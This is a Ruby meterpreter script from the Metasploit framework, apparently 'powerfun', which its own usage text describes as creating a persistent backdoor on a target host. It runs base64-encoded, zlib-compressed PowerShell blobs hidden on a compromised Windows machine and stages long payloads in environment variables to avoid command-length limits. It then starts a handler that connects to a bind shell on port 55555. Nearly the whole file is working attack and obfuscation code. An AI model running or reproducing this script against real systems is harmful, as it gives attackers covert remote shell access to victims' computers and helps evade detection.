##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to imporve this script, please try to port it as a post
# module instead. Thank you.
##


# Authors/Contributors: 
# Ben Turner (https://github.com/benpturner/h00k)
# Dave Hardy (https://github.com/davehardy20/)
# Nicholas Nam (nick[at]executionflow.org)
# RageLtMan

#-------------------------------------------------------------------------------
################## Variable Declarations ##################

# Meterpreter Session
@client = client
downloadall = false
errors = false

@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
  "-r"  => [ false,   "The IP of the system being exploited = rhost"],
  "-a"  => [ false,   "Attempt to download all powershell modules"],
  "-e"  => [ false,   "Show all powershell errors"]

)
meter_type = client.platform

################## Function Declarations ##################

  # Usage Message Function
  #-------------------------------------------------------------------------------
  def usage
    print_line "Meterpreter Script for creating a persistent backdoor on a target host."
    print_line(@exec_opts.usage)
    raise Rex::Script::Completed
  end

  # Function for setting multi handler for autocon
  #-------------------------------------------------------------------------------
  def set_handler(rhost,rport)
    mul = client.framework.exploits.create("multi/handler")
    mul.datastore['WORKSPACE'] = @client.workspace
    mul.datastore['PAYLOAD']   = "windows/shell_bind_tcp"
    mul.datastore['RHOST']     = rhost
    mul.datastore['LPORT']     = rport

    mul.exploit_simple(
      'Payload'        => mul.datastore['PAYLOAD'],
      'RunAsJob'       => true
    )
    print_good("Multi/handler started: payload=windows/shell_bind_tcp rhost=" + rhost + " lport:=55555")
  end

  def have_powershell?
    cmd_out = cmd_exec('cmd.exe /c "echo. | powershell get-host"')
    return true if cmd_out =~ /Name.*Version.*InstanceId/m
    return false
  end

  #
  # Insert substitutions into the powershell script
  #
  def make_subs(script, subs)
    subs.each do |set|
      script.gsub!(set[0],set[1])
    end
    if datastore['VERBOSE']
      print_good("Final Script: ")
      script.each_line {|l| print_status("\t#{l}")}
    end
  end

  #
  # Return an array of substitutions for use in make_subs
  #
  def process_subs(subs)
    return [] if subs.nil? or subs.empty?
    new_subs = []
    subs.split(';').each do |set|
      new_subs << set.split(',', 2)
    end
    return new_subs
  end

  #
  # Read in a powershell script stored in +script+
  #
  def read_script(script)
    script_in = ''
    begin
      # Open script file for reading
      fd = ::File.new(script, 'r')
      while (line = fd.gets)
        script_in << line
      end

      # Close open file
      fd.close()
    rescue Errno::ENAMETOOLONG, Errno::ENOENT
      # Treat script as a... script
      script_in = script
    end
    return script_in
  end

  #
  # Return a zlib compressed powershell script
  #
  def compress_script(script_in, eof = nil)

    # Compress using the Deflate algorithm
    compressed_stream = ::Zlib::Deflate.deflate(script_in,
      ::Zlib::BEST_COMPRESSION)

    # Base64 encode the compressed file contents
    encoded_stream = Rex::Text.encode_base64(compressed_stream)

    # Build the powershell expression
    # Decode base64 encoded command and create a stream object
    psh_expression =  "$stream = New-Object IO.MemoryStream(,"
    psh_expression += "$([Convert]::FromBase64String('#{encoded_stream}')));"
    # Read & delete the first two bytes due to incompatibility with MS
    psh_expression += "$stream.ReadByte()|Out-Null;"
    psh_expression += "$stream.ReadByte()|Out-Null;"
    # Uncompress and invoke the expression (execute)
    psh_expression += "$(Invoke-Expression $(New-Object IO.StreamReader("
    psh_expression += "$(New-Object IO.Compression.DeflateStream("
    psh_expression += "$stream,"
    psh_expression += "[IO.Compression.CompressionMode]::Decompress)),"
    psh_expression += "[Text.Encoding]::ASCII)).ReadToEnd());"

    # If eof is set, add a marker to signify end of script output
    if (eof && eof.length == 8) then psh_expression += "'#{eof}'" end

    # Convert expression to unicode
    unicode_expression = Rex::Text.to_unicode(psh_expression)

    # Base64 encode the unicode expression
    encoded_expression = Rex::Text.encode_base64(unicode_expression)

    return encoded_expression
  end

  #
  # Execute a powershell script and return the results. The script is never written
  # to disk.
  #
  def execute_script(script, time_out = 15)
    running_pids, open_channels = [], []
    # Execute using -EncodedCommand
    session.response_timeout = time_out
    cmd_out = session.sys.process.execute("powershell -EncodedCommand " +
      "#{script}", nil, {'Hidden' => true, 'Channelized' => true})

    # Add to list of running processes
    running_pids << cmd_out.pid

    # Add to list of open channels
    open_channels << cmd_out

    return [cmd_out, running_pids, open_channels]
  end

  #
  # Powershell scripts that are longer than 8000 bytes are split into 8000
  # 8000 byte chunks and stored as environment variables. A new powershell
  # script is built that will reassemble the chunks and execute the script.
  # Returns the reassembly script.
  #
  def stage_to_env(compressed_script, env_suffix = Rex::Text.rand_text_alpha(8))

    # Check to ensure script is encoded and compressed
    if compressed_script =~ /\s|\.|\;/
      compressed_script = compress_script(compressed_script)
    end
    # Divide the encoded script into 8000 byte chunks and iterate
    index = 0
    count = 8000
    while (index < compressed_script.size - 1)
      # Define random, but serialized variable name
      env_prefix = "%05d" % ((index + 8000)/8000)
      env_variable = env_prefix + env_suffix

      # Create chunk
      chunk = compressed_script[index, count]

      # Build the set commands
      set_env_variable =  "[Environment]::SetEnvironmentVariable("
      set_env_variable += "'#{env_variable}',"
      set_env_variable += "'#{chunk}', 'User')"

      # Compress and encode the set command
      encoded_stager = compress_script(set_env_variable)

      # Stage the payload
      print_good(" - Bytes remaining: #{compressed_script.size - index}")
      execute_script(encoded_stager)

      # Increment index
      index += count

    end

    # Build the script reassembler
    reassemble_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
    reassemble_command += "Select-String #{env_suffix}|Sort-Object|%{"
    reassemble_command += "$c+=[Environment]::GetEnvironmentVariable($_,'User')"
    reassemble_command += "};Invoke-Expression $($([Text.Encoding]::Unicode."
    reassemble_command += "GetString($([Convert]::FromBase64String($c)))))"

    # Compress and encode the reassemble command
    encoded_script = compress_script(reassemble_command)

    return encoded_script
  end

  #
  # Log the results of the powershell script
  #
  def write_to_log(cmd_out, log_file, eof)
    # Open log file for writing
    fd = ::File.new(log_file, 'w+')

    # Read output until eof and write to log
    while (line = cmd_out.channel.read())
      if (line.sub!(/#{eof}/, ''))
        fd.write(line)
        vprint_good("\t#{line}")
        cmd_out.channel.close()
        break
      end
      fd.write(line)
      vprint_good("\t#{line}")
    end

    # Close log file
    fd.close()

    return
  end

  #
  # Clean up powershell script including process and chunks stored in environment variables
  #
  def clean_up(script_file = nil, eof = '', running_pids =[], open_channels = [], env_suffix = Rex::Text.rand_text_alpha(8), delete = false)
    # Remove environment variables
    env_del_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
    env_del_command += "Select-String #{env_suffix}|%{"
    env_del_command += "[Environment]::SetEnvironmentVariable($_,$null,'User')}"
    script = compress_script(env_del_command, eof)
    cmd_out, running_pids, open_channels = *execute_script(script)
    write_to_log(cmd_out, "/dev/null", eof)

    # Kill running processes
    running_pids.each() do |pid|
      session.sys.process.kill(pid)
    end


    # Close open channels
    open_channels.each() do |chan|
      chan.channel.close()
    end

    ::File.delete(script_file) if (script_file and delete)

    return
  end


################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  when "-r"
    rhost = val
  when "-a"
    downloadall = true
  when "-e"
    errors = true
  end
}

# End of file marker
eof = Rex::Text.rand_text_alpha(8)
env_suffix = Rex::Text.rand_text_alpha(8)


# Get target's computer name
computer_name = session.sys.config.sysinfo['Computer']

# compress a script
#script_in = read_script("/root/Desktop/powerfun.ps1")
#compressed_script = compress_script(script_in, eof)
#script = compressed_script
#print_status('Executing the script: ' + script)

if (downloadall == true)
encscript="JABzAHQAcgBlAGEAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAZQBOAHEAMQBWAHQAdAB1AEcAegBjAFEAZgBhADYAKwBZAHEAQgB1ADYAMQAxAEUAbwBtAFEARABmAGoASABnAG8ASwA0AHMAcAAwAEoAegBFAFMASQBsAEwAaQBBAEkARQBMADAANwBrAGgAaABUADUASQBMAGsAVwBsAEoAagAvADMAdQBHAGUAOQBNAGwAZQBTAGkASwBpAEMAKwA3AE8ANwBjAHoANQBCAHoATwA3AEQAeABUAHMAUgBOAGEAdwBSAHQAMAA3AFgAdAA4AGkASwBWAEEANQBlAEIAcgBBADIAZwBGADYAeABpAHUANABUADIAdQAyAHgAOABlAHYAbQBEAHMANgBOAFUAeABNAHUAcgBsAFIAcABVAEoAKwAyAFQAeABGAHUAYwA4AGsANgA1AG4ATQBDAEcATgA0AE4ASwBTAFkAKwBCAE0AaAByAFgAVgAwAE8AagBOAGwAaAAxAFoAawBIAHgAUABVAHQAawAyAFgAaABxAE4AZQBaAFYAWQBxAHQAZABvADYASQB0AHkAOAB2AHAAZwBwAFoATgBNAG8AdgBmACsASQAyAHkAYwBMAFoAMQBMADcAVgBXAG4AWQAvAGkAYQBMAFkAUgBiAFoAZwArAFoAUgBSAE4AcgA1AFMAZwBtAGkALwBXAHEAcwArAEwATwBpAFQAbABhAHgAMwAyADQAegB0AEMASABHADYAVgBTAEMAMABjAHEANgA5AEIAMABlAGoAcgBCAC8AZwBiAGoATABEAGMAWQBxAEMAZgA5AGkATwAzADIAYQBJAGwAUwB4AHEAUgBpAHEAVAAwAC8AYQA1ADAAUQA2AGwAYgBLAGcAZgBMAG4AUwA3AEsAZgBDAGQAYgBmAHoASQBWADAAaAB1ADkAagB2AFIATQByADgAYwBqAGQAdgA2AGYARwBlAFMALwBVAEYAOQA3AFQANgBmAFoAawBRAEoANgB3AGIANABiAEQASQBiAGQAMgByAFUAMQB5AFUAcAB5AC8AYwBXAHUAZABvAFgAMwBaAGsAOABLAE0AeABRAHEAVABVAFcAdwBRAGwAVgAxAHEAZAAzAEwAaQBmAGMAUwA1ADkATABSADcAdwBtAEgALwBmAHoARAB3AE0AdwByAFoAdgBqAE4AOABoAFYAUwBBAHgAdwBKADEAcgBMAFcAMABGAFcAZwB1ACsAWgBSAFcAegA1ADgAZAArAGIAUABBAGQAUwBkAHYARAAwAC8AMABsAGsAZQBQAEcAawBVAFAAawBZAEwATQBGAEIAcgBxAEUAcABNAFIAMQBRADUAWAB6AFAAZQB1AGsAWQA0AGYAMABWAGsAMgBqAHQATwAzAHAAYwBYADAAMABxADkARABMADAAWQBIAGEAVgB3AFkANQBkAEwASgB3ADkAYgBoAFoARABvAE4ALwBOAE8AMwBuAFMANQBqAEYANQBlAFgAegA3ADkAOQA3AGIANABVAGIAbQBYAFAAdgBOADQATABjAEIAUABIAG0ARABxAEMASwBWAHAAbABHAFMAbwBnAEUAaQBGAGYAZQBjAHYAQwBoADEASABWAFIANwBrAHMAagBLAEIATQAzAGEASgBLAEsAcQBoAHcANABuAEQAagBHAEMAcgBxAFEAMABJAHQAcABsAGQAWABOADYAUABlAFkAQgBCADUAdgB6ACsAOQBUAGQAaQA4AEYAeQByAFIAYQB3AHQARgB6AFgAMwBQAG0AaQBsAC8ANwA0AHgAWQBMAEIAMgBFAHYAUQBnAHUAdQB1AGUAWAA4AEUANwBFAFIAbABzADkAZAA5AEQAVABKAHQAVQBGADYAUgBqAGMAUwBBAG0ANQBwAFEAVwBEAFYASQBRAG4AVABOAGgATQB6AFYAUgBKAGsATABvAEgAMQBwAEwAOQBYAGwAVQBMAHEANgBaAFMAQwArAHIAYgBQADEATgBIADEANwBRAFEANwBPADUAVAA4AFgAMQBFAC8ARAByAE8ARAB3AGsANgBVAHkAVwBmAHkAaABkAFAAQQA1AC8AegBlAEoAcwBpAG4AUABsAHcAZgA2AEYATQA0AGIAcwBRADAATAA3AEwAcABEAHkARAB1AFQAYQB3ADAAZwBZAGgAUQBjAGMARgB6AFMARQBhAE0AbAB4AHQAbwBSAGcAcwArAGYAYQBiAEIALwBWAGkAOQAwAFkANABEAEgAZQBWAGEAWABWAGIAdQB3AC8AMgBGAHQAWABDAEwAVQB2AG0AMwBXAG4AVAA1AC8ARQBTAHcAbgBKAE8AZwBWAEQAMQB5AEMAcQBDAEYAcQBPAFYAVgBuAGcAdwBjAGkATgAyAHEAOQBkAEsAYQBwADQAUQBJAGEAagBXAFYAWQBEAG8AVwBlAEEAbQBkADMAawBwAEUATgBaAEwASQBUAEUATQBBACsARgBwAFYAQwBiADQARQBYAGsAUwBGAGcAUgB0AFEAYgBjAEYAdwBVAEYAbQBFAGIAUQBWAFEAdgBjAEkASABvAEsAKwBwAHgAVQBtAFkANgBMAFkANABaAGcAdgBiADQAeABYAHMASgB4AHcALwBaAEsAQQBPADkAKwBFAE8AKwA0AFQAMgBJAHQAUgBrAGoAbgBQAHYAVABvAG0AQwBFAFMAMABjADgAcgBQAGoATQBlAFAAbgB0AG0ARAAvAGoAOQBsAGwASQB2AFgAdgA1AC8ARABNADMAegBJAFgATAB0AHcAaAAvAEkAcwBEADMAdwB1AEkATgA5AHYARgBlAEUAVgBOAEkAYwBqAGEATgBJAHoAWABOAEEAeABTAGgAMwBuAGoASQA3AFkAawBMAHUAbAAxADcANgBHAFoAdQBPAFgAWAA0AE8ATgB4AHcAcgBRAEcARwAwAG0AMwBTAG4AQgBhAEkASwB4AE8AVQB6AGsAOQBiAG0ARwB4AFIASwA1AEMAWABQAEIARAB1ADkANgBIAC8AdwBWAEIASgB2AGoAcgBHAGkAUAAvACsAbQBPADcAcwBMAHMAbgA4AFUAUABxAGIAWABQAHIASgBwAFkAeAB6ADUAMwBNAHIATgBMAGEAaABoAFEAMABtAEsAdgBDAGIARwBlADEAQgBhAHIAZABsAE8AMwBvADUASABUAEsAUQBtAEoAUQBmAFgAZgBWAEkAUABXAE4AMQBBAFQAYQBLAE0APQAnACkAKQApADsAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAQgB5AHQAZQAoACkAfABPAHUAdAAtAE4AdQBsAGwAOwAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZABCAHkAdABlACgAKQB8AE8AdQB0AC0ATgB1AGwAbAA7ACQAKABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACgAJABzAHQAcgBlAGEAbQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkALABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApADsAJwB5AFkATQBPAEcAWQBxAGEAJwA="
else
encscript="JABzAHQAcgBlAGEAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAZQBOAHEAMQBWAG0AMQB2ADIAegBZAFEALwBqAHoALwBDAHMATABSAFYAZwBtADEAYQBTAGQAQQB2AGcAUgBJAHMAYwB4AHgAQwBtAE4AOQBNAGEAcQAwAEcAVwBBAFkAQwBFAE8AZABMAGQAWQAwAEsAWgBCAFUANQBLAHoASgBmADkAKwBSAGsAdgB3AFMANwBNAE0AdwAxAEEAUQBNAFMAZgBmAHkAUABNAGUANwA0ADkARwBMAFUAbgBFAG4AdABDAEwAdgB3AGYAWAB2ADQASQBGAEwAQQBjAHEAUgBIAHgAMgBDAEsANgBvADQAdQBTAFMAZgBvAE8AcAAvAGYAdgBnAE8AMwBPAEcAcgBvADIAZwAwAEMAawBhAHQAQwBmADEAcQA0AFIAbwBXAHIASgBSAHUAWgBDAEIARABqAFcARABTAG8AbQBQAGsAVABBAGwAYgBxADYAbgBSAG0AeQBmADYAeQBnAEwAbABlADUATABXAHQAdgBQAFMANgBTAHoAYQB3AEEAcABkAGcAYwBFAHYAagBNAG4AcgBvADcAWABPAFMAZwBuAGUAKwAvAGUANAA4AHkAWgAzAHIAcgBBAFgAZwA0AEYAaABGAFYAMABLAGwANQBjAFAAcABRAFgARAB0AFgASwBJAFMAYgBsAGUARAA5AGIATQBPAGIARQBBADYANQBpAEgARwAwAHcAOQBYAEYAcABJAEwAUgB5AHEAcgBBAE0AegBHAE8AawBNAHgAaAB2AGcAWgBUAEMAWQBxAEUAZQA5AGcAbgA0AC8AegBVAEYASwBqAGkAcABhADIATgBNADMAdgBTAE4AUwBYAFUAcwA1AFUAVAA2AC8ASwBQAHUAWgBaAE8AUABOAFEAawBoAG4AMgBEADcAWABSADcARQBXAEsAKwBiACsAUABqAGIAUABKADYARwArAHMANQBFAHUAbgBvADUARwA1AEIAdgAyAC8AWABRADYAWgBkAFoAVwAyAG0AUgBIADUAZgBrAFQAbgBxAHcAegB1AEMAOQA3AFYASgBwAGIAcwBZAFkAcwA1AFEAWgBBADIAVgB5ADcAbwB6AGYAZQBGADEAaABJADMAMwBhAFAATQBCADMALwBqAHcANwA4AEIAawBMADIAYgB3AHgAYgBBAHgAWgBnAFYAYgBQAGUAYQBpADEAdABTAHgAbwBrAFgANAB2ADIAKwBiAE8AUgB2AHcAbQBvAEIAbQBFADgAUABPAEoAYgBRAEUAOAA2ADkAUQB5AFIAQQBzADAAVQBHAEoAdwBTAHMAeABSAHIAQgAyAHYAcQBaADEAZQBxACsAUQBxAGMAcABiAGUAOAArAE4AQgBZAHoATQAvADkATwB2AFMAaQBtAEUAagBqADQAaQBSAEkAWgB3ADkAUABEAG0AYgB6AGUAZQBTAGYAZgB1AHcATQBLAFQAMAA3AFAAMwAvACsAOQBjAGYAdwBwAFgAWgByAFoAdQBiAGwASABzAEEAVgA1ADEAQQA0AHAASwBsAEgAWgBRAE0AVgBZAFIATQBCAFcAMwB2AEwAMgBvAGQAaQAxAGQATQBnAGkAeABQAFMAaABHADUAQgBaAFMAMQBWAFAASABPAHcAYwBSAFEAVQB6AGkARwBoAGwAdgBPAEwAaQA2AHQAMABOAEoAawBrADMAdQA4AFAAYgB4AE4AMwA3ADQAVABLAGQARwBWAEoAWABYAE0ALwBzACsANgBWAFAAMwBkAEcATABIAE4ASAA0AGwARgBDAHoAbwBhAG4ANQArAFMAagA0AEUAWgBiAHYAWABCAGsAcABFADIAaAA2ADYAYQBqADUARQBwAEsARQBpAHcAdABNAFkAQgBGAGUASQBTAE0AMwBxAHQANwAxAFQAMABJAG0ATgA0AFoANABTAEQAZQBoAGQAWQBiADkAbgBZAGYAOQBBAE8AbwBwAGMAdQBiADEASgAvAGMAYQBEAE4AbQBQAEMAZAB4AE0ANgBtAEoAVQBOAHUAaABYAGEATwBlADEATABmAEwAQwBmADcAaQBnADIAcwBuAG8AZABlADYAVQBsAEsAegBEAEoATwBDACsAMgAwAGgAawBtAGMAQgBtADkAcgBuAHAAVwBhAHAAYwBpAEUAaABqAGkAUABoAGMAOQBrAEUAKwBRAFYAWQBGAHQAZABWADYAcABGAGgAagAwAFEASAAwAFMAVwBrAHIANABBAE0ANgB3AGoAcQBBAE0ASQBPAHgAegA2ADMAawBOADEAaQBuAGcALwB2AHUAcQBaAHQAdgBJAEsARwByAEkAKwBiAEsAdQB4ADgATQArAGEAWQBEADIAQQBQAG8ANgBsAG8AQwBMADUATgBGAFkAbABFAHMAbgBNAEsAZQBXAE4AOAA1AGMAcwA3AEcAZgAvAFYAbwBKAHkAOQArACsAMgBVAFAASgBQAFAAcABlAHYAWAA3AHEAVABKADUANABIAFAARwBRAG4ANwBiAFIASABlAGsAdQA0ADAASgBWADEAOAB4AGsAdgBNAG8AOQBRADgAbABEAFcAaABVACsAWgB5AHIAMwAxAEgAdQBwADEAZgBUAHEASwBOADUANAByAEEARwBHADEAbQB3AHoAbgBTAGEASwBTAHgAZwBTAGIAeAArAHEAQwBoAFgAQQBJAHoAYwBSAEQAcwArAEMANwAzAHkAZAArAFMAYQBQAE0ANgBLAHQAegBqAGYAMgByAFUASABjAHgAKwBMAHYANgAxAHYAZgBhADcAYQA5AHQAYwByADMAMQB1AFoARwBsAHoAUABEAFUAawBhAEEANQBPAEkAaAAxAEoAYgBhAEUAOQBjADkAcwB6AG0AVABwAGQAbwBCAEEANwBhAFAAdQBYAG8AbwBQAHIASAAzAFIAZQBDAEgAYwA9ACcAKQApACkAOwAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZABCAHkAdABlACgAKQB8AE8AdQB0AC0ATgB1AGwAbAA7ACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkAEIAeQB0AGUAKAApAHwATwB1AHQALQBOAHUAbABsADsAJAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEQAZQBmAGwAYQB0AGUAUwB0AHIAZQBhAG0AKAAkAHMAdAByAGUAYQBtACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQAsAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAOwAnAHAAdgBOAGEAWQBRAGEARwAnAA=="
end

if (errors == true)
encscript = "JABzAHQAcgBlAGEAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAZQBOAHEAMQBWAHQAdAB1ADIAegBnAFEAZgBWADUALwB4AFMARABRAGIAaQBUAFUAcABwADAAQQBlAFEAbQBRAFkAcgBPAE8AMAB6AFYANgBNADIAcQAzAFcAYwBBAHcAWQBFAFkAYQAyADYAeABwAFUAaQBDAHAAMgBOADQAbQAvADcANQBEADMAWAB4AHAASAA0AHAARgB6AFIAZQBKAGMAegBzAGoAegB1AEcATQBaAHAAbQBLAG4AZABBAEsAMwBxAEIAcgBQAGUAQgBqAEwAQQBVAHEAQgA5ADgAYQBRAEMAdABZAHgAMwBBAEQASAAzAEQAZAArAHYAagA0AEYAVwBOAEgAcgA0ADYAUgBVAFQAYwAzAHEAawB6AFkAWgA0AHQAMwBPAE8ATwBaAGQARgAyAEQAQwBXAGsARQBsADUAWQBjAEEAMgBjAHkAcgBLADAARwBSAG0AKwAyADcATQBpAEMANQBIAHUAUwB5AHIAYgB4ADAAbQBqAE0AcQBzAFIAUwB2AFUAWgBEAE8AOAByAEoANgA0AE8AVgBUAGoASwBKADMAdgB2AFAAcwBIAEcAKwBjAEMANgAxADEAKwAyADIANABXAHMAMgBGADIANgBSAFAAVwBZAFcAVABhAHkAVgBvADUAZwBzADEAcQB2ADIAaQBqAHMAbgBaAG0AZwBkADkAKwBIAGEAQQB4ADkAdQBtAEUAbwB0AEgASwBtAHMAUQA5AFAAdQA2AGcAUgA3AEcANAB5AHoAMwBLAEMAdgBuAHYAUQBTAFcANgAzAGgAQQBxAFcATQBTAGMAVgBTAGUAMwBIAGUAUABDAEgAVQBuAFoAUgA5ADUAYwArAFgAWgBMADgAUwByAEwAZQBaAEMAZQBrAE0AMwA4AGQANgBMADEAWgBpAHkAZAAyAC8AcAA4AGIANQBJAE4AUgBYADMAdABYAHAAOQBtAFIAQQBuAHIAQgB2AEIAbwBNAEIAdAAzAGEAdABUAFgASgBTAG4ATABlADQAdABjADcAUQBkADkAbQBUAHcAbwB6AEUAQwBwAE4AaABiAEIAQwBWAFgAVwBoADMAYwB1AEoAOQB3AHAAbgAwAHQASAB2AEMAUQBlADkALwBNAFAAQQBMAEMAdABtADYATgAzAHkARgBWAEkAQgBsAGcAVAByAFMAVwB0AG8ASwBOAEoAZAA4AFQAcQB2AG4AcgA0ADcAOABSAGUAQwA2AG4AYgBlAEgASgAzAHIATABvADAAZQBOAG8AbwBkAEkAUQBXAFkASwBEAFgAVwBKADgAWgBCAHEAaAB5AHYAbQBlADkAZABRAHgAMAB0ADAAbABvADMAaQA5AEYAMQBwAE0AYgBuAHkANgA5AEMATAAwAFUARQBhAEYAMABhADUAZABQAHkANABkAFQAaQBlAFQAQQBMAC8AOQBHADIAbgB3ADkAagBsADEAZABYAHoANwA5ADgANgBMADQAVgBiADIAVABOAHYAOQBnAEwAYwB4AGoARwBtAGoAbQBDAEsAVgBsAG0ARwBDAG8AaABFAHkARgBmAGUAcwB2AEIAaABWAFAAVgBoAEwAZwBzAGoASwBGAE8AMwBxAEoASQBLAEsAaAB3ADcAMwBEAGkARwBpAHYAcQBRAFUAUABQAEoAOQBmAFgAdABzAE4AdgB2AFIAOQA3AHYATAAyADgAVABuAGoAMABJAGwAZQBpADEAaABhAEwAbQB2AG0AZABOAGwAYgA5ADMAUgBzAHcAWABEAHMASgB1AEIASgBlAGQAaQB5AHQANABMADIASwBqAHIAWgA0ADUANgBHAHEAVAA2AG8ASgAwAEQARwA2AGwAaABOAHoAUwBnAGsARQBxAHcAaABNAG0AYgBLAHEAbQBxAGkAUgBJADMAUQBOAHIAeQBYADYAdgBxAG8AVgBWAFUANgBrAEYAOQBlADIAZgBxAHEATgByAFcAZwBoADIAOQA2AG4AWQBIAHgARwAvAGoAdgBOAEQAZwBrADUAVgB5AGEAZgB5AHgAZABQAEEANQB6AHoAYQBwAGcAagBuAFAAdAB6AGYASwBGAFAANABMAGcAUwAwADcAagBNAHAAegAyAEcAbQBEAGEAeQAwAFEAVQBqAFEAYwBVAEYAegBpAEkAWQBNAFYAMQBzAG8AQgBrAHYAKwArAFcAYwBIADkAVwBJAFAAUgBqAGcATQBkADUAVgBwAGQAcABxADcARABYAHUASABhAHUANABXAEoAZgBQAHUAdABlAG4AeABlAEEARgBoAE8AYQBkAEEAcQBIAHAAawBGAFUARwBMADAAVQBvAHIAUABCAGkANQBFAGIAdgBUAGEAeQBVADEAVAA0AGcAUQBWAE8AcwBxAFEAUABRAHMAYwBKAE8ANwB2AEIAUQBJADYANABXAFEARwBJAGEAQgA4AEQAUQBxAEUALwB5AEUAUABBAGsATABnAGoAYQBoADAANABUAGcASQBMAE0ASQBXAGcAcQBoAGMAdwBRAFAAUQBjAC8AVABDAHAATQBSAFUAZQB4AHcAegBKAGMAMwB4AGkAdABZAFQAcgBoAGUAUwBjAEMAZABiADgASQBkADkAdwBuAHMAeABTAGoASgBuAE8AZABlAEgAUgBNAEUASQB0AG8ANQA1AFcAZgBHADQANgBWAG4AZAByAC8AMwBUAHgAbgBsADgAdgBVAGYARgAvAEEATQBIAHoAUABYAEsAdAB5AGgAUABNAHMARABuADAAdgBJAHYANwBlAEsAOABBAHIATwBCAGsATQA0AG8AMgBjADQAcAAyAE8AVQBPAHMANABaAEgAYgBFAEIAZAB3AHUAdgBmAFEAMQBuAGoAZAArAEMAagBZAGMASwAwAEIAaAB0AHgAcAAwAEoAbwBXAGgAQwBzAFQAbABLAFIATwBwAGMAdwBXAEsASgAzAEkAUgArAHYAdwBPADcAMgBVAGQAKwBCAGMASABtAE8AQwBYADYAdwBKACsANgBvAEwAcwB3ACsAdwBmAHgAUQAxADcAdAAwADYAcABtADEAYgBIAFAAdgBjAHoAcwBnAHIAbwBGAGwASgB6AFkANgAwAEMAcwBLADcAWABGAHEAdABmAFUAdgBXAGoAbwBkAEUAcABDAG8AawAvADkASwA5AFcAZwA5AFIAKwBQAGYAVwBnADYAJwApACkAKQA7ACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkAEIAeQB0AGUAKAApAHwATwB1AHQALQBOAHUAbABsADsAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAQgB5AHQAZQAoACkAfABPAHUAdAAtAE4AdQBsAGwAOwAkACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoACQAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoACQAcwB0AHIAZQBhAG0ALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQA7ACcAcABjAGgAeQBpAEoATABtACcA"
end

print_status("Starting PowerShell on host: " + computer_name)

# Execute the powershell script
cmd_out, running_pids, open_channels = execute_script(encscript, 15)

# Default parameters for payload
rhost = @client.session_host
rport = 55555

set_handler(rhost,rport)
print_status("If a shell is unsuccesful, ensure you have access to the target host and port. Maybe you need to add a route (route add ?)")





